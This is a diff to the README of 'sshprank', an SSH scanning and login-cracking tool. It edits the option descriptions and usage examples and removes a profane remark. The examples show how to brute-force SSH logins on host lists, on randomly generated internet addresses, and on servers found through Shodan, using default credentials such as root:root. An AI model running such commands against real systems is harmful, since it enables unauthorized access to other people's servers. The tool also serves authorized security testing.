@@ -38,11 +38,11 @@ modes
                           you need to specify '--source-ip <some_ipaddr>' which
                           is needed by masscan. better check masscan options!
 
-  -s <str:page:lim>     - search ssh servers using shodan and crack logins.
+  -s <str;page;lim>     - search ssh servers using shodan and crack logins.
                           see examples below. note: you need a better API key
                           than this one i offer in order to search more than 100
                           (= 1 page) ssh servers. so if you use this one use
-                          '1' for 'page'. don't bother me with this, bitch
+                          '1' for 'page'.
 
   -b <file>             - list of hosts to grab sshd banner from
                           format: <host>[:ports]. multiple ports can be
@@ -79,22 +79,22 @@ misc
 examples
 
   # crack targets from a given list with user admin, pw-list and 20 host-threads
-  $ ./sshprank -l sshds.txt -u admin -P /tmp/passlist.txt -x 20
+  $ sshprank -l sshds.txt -u admin -P /tmp/passlist.txt -x 20
 
   # first scan then crack from founds ssh services
-  $ sudo ./sshprank -m '-p22,2022 --rate 5000 --source-ip 192.168.13.37 \
+  $ sudo sshprank -m '-p22,2022 --rate 5000 --source-ip 192.168.13.37 \
     --range 192.168.13.1/24'
 
   # generate 1k random ipv4 addresses, then port-scan (tcp/22 here) with 1k p/s
   # and crack login 'root:root' on found sshds
-  $ sudo ./sshprank -m '-p22 --rate=1000' -r 1000 -v
+  $ sudo sshprank -m '-p22 --rate=1000' -r 1000 -v
 
   # search 50 ssh servers via shodan and crack logins using 'root:root' against
   # found sshds
-  $ sudo ./sshprank -s 'SSH:1:50'
+  $ sshprank -s 'SSH;1;50'
 
   # grab banners and output to file with format supported for '-l' option
-  $ ./sshprank -b hosts.txt > sshds2.txt
+  $ sshprank -b hosts.txt > sshds2.txt
 ```
 
 # Author
